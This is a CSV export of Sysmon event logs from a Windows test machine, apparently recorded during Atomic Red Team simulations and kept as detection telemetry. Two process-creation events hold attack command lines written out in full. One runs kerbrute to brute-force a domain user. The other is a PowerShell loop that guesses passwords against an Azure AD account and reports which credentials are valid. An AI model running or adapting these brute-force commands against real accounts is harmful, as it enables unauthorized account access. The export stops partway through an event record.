Channel,CommandLine,Company,Computer,CreationUtcTime,CurrentDirectory,Description,EventID,EventRecordID,FileVersion,Hashes,Image,IntegrityLevel,Keywords,Level,LogonGuid,LogonId,Message,Opcode,OriginalFileName,ParentCommandLine,ParentImage,ParentProcessGuid,ParentProcessId,ParentUser,ProcessGuid,ProcessID,ProcessId,Product,QueryName,QueryResults,QueryStatus,RenderingInfo,RuleName,SystemTime,TargetFilename,Task,TerminalSessionId,ThreadID,User,UserID,UtcTime,Version,raw
Microsoft-Windows-Sysmon/Operational,"""C:\Windows\system32\appidcertstorecheck.exe""",Microsoft Corporation,WinDev2309Eval,,C:\Windows\system32\,AppID Certificate Store Verification Task,1,19590,10.0.22621.2506 (WinBuild.160101.0800),"MD5=A3D3C1CF254BF1B45F5950EFAD6621AF,SHA256=82906ECB6EE934ED28839F127F7994A517B9D9C83746187246D6F226FB6A65E6,IMPHASH=7168353EDBE3AB24A184BB681FD55AE6",C:\Windows\System32\appidcertstorecheck.exe,System,0x8000000000000000,Information,{f57bd86a-36f6-658c-e503-000000000000},0x3e5,"Process Create:

RuleName: -

UtcTime: 2023-12-27 20:50:53.609

ProcessGuid: {f57bd86a-8e2d-658c-d201-000000000f00}

ProcessId: 10536

Image: C:\Windows\System32\appidcertstorecheck.exe

FileVersion: 10.0.22621.2506 (WinBuild.160101.0800)

Description: AppID Certificate Store Verification Task

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: AppIDCertstoreCheck.exe

CommandLine: ""C:\Windows\system32\appidcertstorecheck.exe""

CurrentDirectory: C:\Windows\system32\

User: NT AUTHORITY\LOCAL SERVICE

LogonGuid: {f57bd86a-36f6-658c-e503-000000000000}

LogonId: 0x3E5

TerminalSessionId: 0

IntegrityLevel: System

Hashes: MD5=A3D3C1CF254BF1B45F5950EFAD6621AF,SHA256=82906ECB6EE934ED28839F127F7994A517B9D9C83746187246D6F226FB6A65E6,IMPHASH=7168353EDBE3AB24A184BB681FD55AE6

ParentProcessGuid: {f57bd86a-36f6-658c-1d00-000000000f00}

ParentProcessId: 1496

ParentImage: C:\Windows\System32\svchost.exe

ParentCommandLine: C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule

ParentUser: NT AUTHORITY\SYSTEM",Info,AppIDCertstoreCheck.exe,C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule,C:\Windows\System32\svchost.exe,{f57bd86a-36f6-658c-1d00-000000000f00},1496,NT AUTHORITY\SYSTEM,{f57bd86a-8e2d-658c-d201-000000000f00},3588,10536,Microsoft® Windows® Operating System,,,,"
      ",-,2023-12-27T20:50:53.6134031Z,,Process Create (rule: ProcessCreate),0,5124,NT AUTHORITY\LOCAL SERVICE,S-1-5-18,2023-12-27 20:50:53.609,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T20:50:53.6134031Z""/>
      <EventRecordID>19590</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 20:50:53.609</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-8e2d-658c-d201-000000000f00}</Data>
      <Data Name=""ProcessId"">10536</Data>
      <Data Name=""Image"">C:\Windows\System32\appidcertstorecheck.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.2506 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">AppID Certificate Store Verification Task</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">AppIDCertstoreCheck.exe</Data>
      <Data Name=""CommandLine"">""C:\Windows\system32\appidcertstorecheck.exe""</Data>
      <Data Name=""CurrentDirectory"">C:\Windows\system32\</Data>
      <Data Name=""User"">NT AUTHORITY\LOCAL SERVICE</Data>
      <Data Name=""LogonGuid"">{f57bd86a-36f6-658c-e503-000000000000}</Data>
      <Data Name=""LogonId"">0x3e5</Data>
      <Data Name=""TerminalSessionId"">0</Data>
      <Data Name=""IntegrityLevel"">System</Data>
      <Data Name=""Hashes"">MD5=A3D3C1CF254BF1B45F5950EFAD6621AF,SHA256=82906ECB6EE934ED28839F127F7994A517B9D9C83746187246D6F226FB6A65E6,IMPHASH=7168353EDBE3AB24A184BB681FD55AE6</Data>
      <Data Name=""ParentProcessGuid"">{f57bd86a-36f6-658c-1d00-000000000f00}</Data>
      <Data Name=""ParentProcessId"">1496</Data>
      <Data Name=""ParentImage"">C:\Windows\System32\svchost.exe</Data>
      <Data Name=""ParentCommandLine"">C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule</Data>
      <Data Name=""ParentUser"">NT AUTHORITY\SYSTEM</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-27 20:50:53.609

ProcessGuid: {f57bd86a-8e2d-658c-d201-000000000f00}

ProcessId: 10536

Image: C:\Windows\System32\appidcertstorecheck.exe

FileVersion: 10.0.22621.2506 (WinBuild.160101.0800)

Description: AppID Certificate Store Verification Task

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: AppIDCertstoreCheck.exe

CommandLine: ""C:\Windows\system32\appidcertstorecheck.exe""

CurrentDirectory: C:\Windows\system32\

User: NT AUTHORITY\LOCAL SERVICE

LogonGuid: {f57bd86a-36f6-658c-e503-000000000000}

LogonId: 0x3E5

TerminalSessionId: 0

IntegrityLevel: System

Hashes: MD5=A3D3C1CF254BF1B45F5950EFAD6621AF,SHA256=82906ECB6EE934ED28839F127F7994A517B9D9C83746187246D6F226FB6A65E6,IMPHASH=7168353EDBE3AB24A184BB681FD55AE6

ParentProcessGuid: {f57bd86a-36f6-658c-1d00-000000000f00}

ParentProcessId: 1496

ParentImage: C:\Windows\System32\svchost.exe

ParentCommandLine: C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule

ParentUser: NT AUTHORITY\SYSTEM</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,2023-12-27 20:50:47.356,,,11,19589,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,0x8000000000000000,Information,,,"File created:

RuleName: -

UtcTime: 2023-12-27 20:50:47.356

ProcessGuid: {f57bd86a-8e27-658c-d001-000000000f00}

ProcessId: 4956

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

TargetFilename: C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_pz243ty2.jjf.ps1

CreationUtcTime: 2023-12-27 20:50:47.356

User: WINDEV2309EVAL\User",Info,,,,,,,{f57bd86a-8e27-658c-d001-000000000f00},3588,4956,,,,,"
      ",-,2023-12-27T20:50:47.3607847Z,C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_pz243ty2.jjf.ps1,File created (rule: FileCreate),,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 20:50:47.356,2,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>11</EventID>
      <Version>2</Version>
      <Level>4</Level>
      <Task>11</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T20:50:47.3607847Z""/>
      <EventRecordID>19589</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 20:50:47.356</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-8e27-658c-d001-000000000f00}</Data>
      <Data Name=""ProcessId"">4956</Data>
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""TargetFilename"">C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_pz243ty2.jjf.ps1</Data>
      <Data Name=""CreationUtcTime"">2023-12-27 20:50:47.356</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>File created:

RuleName: -

UtcTime: 2023-12-27 20:50:47.356

ProcessGuid: {f57bd86a-8e27-658c-d001-000000000f00}

ProcessId: 4956

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

TargetFilename: C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_pz243ty2.jjf.ps1

CreationUtcTime: 2023-12-27 20:50:47.356

User: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>File created (rule: FileCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,"""powershell.exe"" & {cd \""""C:\AtomicRedTeam\atomics\..\ExternalPayloads\""""
.\kerbrute.exe bruteuser --dc $ENV:userdnsdomain -d $ENV:userdomain $env:temp\bruteuser.txt TestUser1}",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Windows PowerShell,1,19588,10.0.22621.2506 (WinBuild.160101.0800),"MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,Medium,0x8000000000000000,Information,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,"Process Create:

RuleName: -

UtcTime: 2023-12-27 20:50:47.254

ProcessGuid: {f57bd86a-8e27-658c-d001-000000000f00}

ProcessId: 4956

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

FileVersion: 10.0.22621.2506 (WinBuild.160101.0800)

Description: Windows PowerShell

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: PowerShell.EXE

CommandLine: ""powershell.exe"" & {cd \""""C:\AtomicRedTeam\atomics\..\ExternalPayloads\""""
.\kerbrute.exe bruteuser --dc $ENV:userdnsdomain -d $ENV:userdomain $env:temp\bruteuser.txt TestUser1}

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20

ParentProcessGuid: {00000000-0000-0000-0000-000000000000}

ParentProcessId: 1688

ParentImage: -

ParentCommandLine: -

ParentUser: -",Info,PowerShell.EXE,-,-,{00000000-0000-0000-0000-000000000000},1688,-,{f57bd86a-8e27-658c-d001-000000000f00},3588,4956,Microsoft® Windows® Operating System,,,,"
      ",-,2023-12-27T20:50:47.2557051Z,,Process Create (rule: ProcessCreate),1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 20:50:47.254,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T20:50:47.2557051Z""/>
      <EventRecordID>19588</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 20:50:47.254</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-8e27-658c-d001-000000000f00}</Data>
      <Data Name=""ProcessId"">4956</Data>
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.2506 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Windows PowerShell</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">PowerShell.EXE</Data>
      <Data Name=""CommandLine"">""powershell.exe"" &amp; {cd \""""C:\AtomicRedTeam\atomics\..\ExternalPayloads\""""
.\kerbrute.exe bruteuser --dc $ENV:userdnsdomain -d $ENV:userdomain $env:temp\bruteuser.txt TestUser1}</Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      <Data Name=""LogonId"">0x2f87b</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20</Data>
      <Data Name=""ParentProcessGuid"">{00000000-0000-0000-0000-000000000000}</Data>
      <Data Name=""ParentProcessId"">1688</Data>
      <Data Name=""ParentImage"">-</Data>
      <Data Name=""ParentCommandLine"">-</Data>
      <Data Name=""ParentUser"">-</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-27 20:50:47.254

ProcessGuid: {f57bd86a-8e27-658c-d001-000000000f00}

ProcessId: 4956

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

FileVersion: 10.0.22621.2506 (WinBuild.160101.0800)

Description: Windows PowerShell

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: PowerShell.EXE

CommandLine: ""powershell.exe"" &amp; {cd \""""C:\AtomicRedTeam\atomics\..\ExternalPayloads\""""
.\kerbrute.exe bruteuser --dc $ENV:userdnsdomain -d $ENV:userdomain $env:temp\bruteuser.txt TestUser1}

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20

ParentProcessGuid: {00000000-0000-0000-0000-000000000000}

ParentProcessId: 1688

ParentImage: -

ParentCommandLine: -

ParentUser: -</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,2023-12-27 20:50:45.576,,,11,19587,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,0x8000000000000000,Information,,,"File created:

RuleName: -

UtcTime: 2023-12-27 20:50:45.576

ProcessGuid: {f57bd86a-8e25-658c-ce01-000000000f00}

ProcessId: 6236

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

TargetFilename: C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_rpiyrxmp.bjr.ps1

CreationUtcTime: 2023-12-27 20:50:45.576

User: WINDEV2309EVAL\User",Info,,,,,,,{f57bd86a-8e25-658c-ce01-000000000f00},3588,6236,,,,,"
      ",-,2023-12-27T20:50:45.5824403Z,C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_rpiyrxmp.bjr.ps1,File created (rule: FileCreate),,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 20:50:45.576,2,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>11</EventID>
      <Version>2</Version>
      <Level>4</Level>
      <Task>11</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T20:50:45.5824403Z""/>
      <EventRecordID>19587</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 20:50:45.576</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-8e25-658c-ce01-000000000f00}</Data>
      <Data Name=""ProcessId"">6236</Data>
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""TargetFilename"">C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_rpiyrxmp.bjr.ps1</Data>
      <Data Name=""CreationUtcTime"">2023-12-27 20:50:45.576</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>File created:

RuleName: -

UtcTime: 2023-12-27 20:50:45.576

ProcessGuid: {f57bd86a-8e25-658c-ce01-000000000f00}

ProcessId: 6236

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

TargetFilename: C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_rpiyrxmp.bjr.ps1

CreationUtcTime: 2023-12-27 20:50:45.576

User: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>File created (rule: FileCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,"""powershell.exe"" & {Import-Module -Name AzureAD

$passwords = \""""Password1`n1q2w3e4r`nPassword!\"""".split(\""""{`n}\"""")
foreach($password in $passwords) {
  $PWord = ConvertTo-SecureString -String \""""$password\"""" -AsPlainText -Force
  $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \""""bruce.wayne@contoso.com\"""", $Pword
  try {
    Write-Host \"""" [-] Attempting ${password} on account bruce.wayne@contoso.com.\""""
    Connect-AzureAD -Credential $Credential 2>&1> $null
    # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success
    Write-Host \"""" [!] bruce.wayne@contoso.com:${password} are valid credentials!`r`n\""""
    break
  } catch {
    Write-Host \"""" [-] bruce.wayne@contoso.com:${password} invalid credentials.`r`n\""""
  }
}
Write-Host \""""End of bruteforce\""""}",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Windows PowerShell,1,19586,10.0.22621.2506 (WinBuild.160101.0800),"MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,Medium,0x8000000000000000,Information,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,"Process Create:

RuleName: -

UtcTime: 2023-12-27 20:50:45.463

ProcessGuid: {f57bd86a-8e25-658c-ce01-000000000f00}

ProcessId: 6236

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

FileVersion: 10.0.22621.2506 (WinBuild.160101.0800)

Description: Windows PowerShell

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: PowerShell.EXE

CommandLine: ""powershell.exe"" & {Import-Module -Name AzureAD

$passwords = \""""Password1`n1q2w3e4r`nPassword!\"""".split(\""""{`n}\"""")
foreach($password in $passwords) {
  $PWord = ConvertTo-SecureString -String \""""$password\"""" -AsPlainText -Force
  $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \""""bruce.wayne@contoso.com\"""", $Pword
  try {
    Write-Host \"""" [-] Attempting ${password} on account bruce.wayne@contoso.com.\""""
    Connect-AzureAD -Credential $Credential 2>&1> $null
    # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success
    Write-Host \"""" [!] bruce.wayne@contoso.com:${password} are valid credentials!`r`n\""""
    break
  } catch {
    Write-Host \"""" [-] bruce.wayne@contoso.com:${password} invalid credentials.`r`n\""""
  }
}
Write-Host \""""End of bruteforce\""""}

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20

ParentProcessGuid: {00000000-0000-0000-0000-000000000000}

ParentProcessId: 1688

ParentImage: -

ParentCommandLine: -

ParentUser: -",Info,PowerShell.EXE,-,-,{00000000-0000-0000-0000-000000000000},1688,-,{f57bd86a-8e25-658c-ce01-000000000f00},3588,6236,Microsoft® Windows® Operating System,,,,"
      ",-,2023-12-27T20:50:45.4647748Z,,Process Create (rule: ProcessCreate),1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 20:50:45.463,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T20:50:45.4647748Z""/>
      <EventRecordID>19586</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 20:50:45.463</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-8e25-658c-ce01-000000000f00}</Data>
      <Data Name=""ProcessId"">6236</Data>
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.2506 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Windows PowerShell</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">PowerShell.EXE</Data>
      <Data Name=""CommandLine"">""powershell.exe"" &amp; {Import-Module -Name AzureAD

$passwords = \""""Password1`n1q2w3e4r`nPassword!\"""".split(\""""{`n}\"""")
foreach($password in $passwords) {
  $PWord = ConvertTo-SecureString -String \""""$password\"""" -AsPlainText -Force
  $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \""""bruce.wayne@contoso.com\"""", $Pword
  try {
    Write-Host \"""" [-] Attempting ${password} on account bruce.wayne@contoso.com.\""""
    Connect-AzureAD -Credential $Credential 2&gt;&amp;1&gt; $null
    # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success
    Write-Host \"""" [!] bruce.wayne@contoso.com:${password} are valid credentials!`r`n\""""
    break
  } catch {
    Write-Host \"""" [-] bruce.wayne@contoso.com:${password} invalid credentials.`r`n\""""
  }
}
Write-Host \""""End of bruteforce\""""}</Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      <Data Name=""LogonId"">0x2f87b</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20</Data>
      <Data Name=""ParentProcessGuid"">{00000000-0000-0000-0000-000000000000}</Data>
      <Data Name=""ParentProcessId"">1688</Data>
      <Data Name=""ParentImage"">-</Data>
      <Data Name=""ParentCommandLine"">-</Data>
      <Data Name=""ParentUser"">-</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-27 20:50:45.463

ProcessGuid: {f57bd86a-8e25-658c-ce01-000000000f00}

ProcessId: 6236

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

FileVersion: 10.0.22621.2506 (WinBuild.160101.0800)

Description: Windows PowerShell

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: PowerShell.EXE

CommandLine: ""powershell.exe"" &amp; {Import-Module -Name AzureAD

$passwords = \""""Password1`n1q2w3e4r`nPassword!\"""".split(\""""{`n}\"""")
foreach($password in $passwords) {
  $PWord = ConvertTo-SecureString -String \""""$password\"""" -AsPlainText -Force
  $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \""""bruce.wayne@contoso.com\"""", $Pword
  try {
    Write-Host \"""" [-] Attempting ${password} on account bruce.wayne@contoso.com.\""""
    Connect-AzureAD -Credential $Credential 2&gt;&amp;1&gt; $null
    # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success
    Write-Host \"""" [!] bruce.wayne@contoso.com:${password} are valid credentials!`r`n\""""
    break
  } catch {
    Write-Host \"""" [-] bruce.wayne@contoso.com:${password} invalid credentials.`r`n\""""
  }
}
Write-Host \""""End of bruteforce\""""}

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20

ParentProcessGuid: {00000000-0000-0000-0000-000000000000}

ParentProcessId: 1688

ParentImage: -

ParentCommandLine: -

ParentUser: -</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,2023-12-27 20:50:43.126,,,11,19585,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,0x8000000000000000,Information,,,"File created:

RuleName: -

UtcTime: 2023-12-27 20:50:43.126

ProcessGuid: {f57bd86a-8e22-658c-cc01-000000000f00}

ProcessId: 10912

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

TargetFilename: C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_rxs45iny.vam.ps1

CreationUtcTime: 2023-12-27 20:50:43.126

User: WINDEV2309EVAL\User",Info,,,,,,,{f57bd86a-8e22-658c-cc01-000000000f00},3588,10912,,,,,"
      ",-,2023-12-27T20:50:43.1319557Z,C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_rxs45iny.vam.ps1,File created (rule: FileCreate),,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 20:50:43.126,2,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>11</EventID>
      <Version>2</Version>
      <Level>4</Level>
      <Task>11</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T20:50:43.1319557Z""/>
      <EventRecordID>19585</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 20:50:43.126</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-8e22-658c-cc01-000000000f00}</Data>
      <Data Name=""ProcessId"">10912</Data>
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
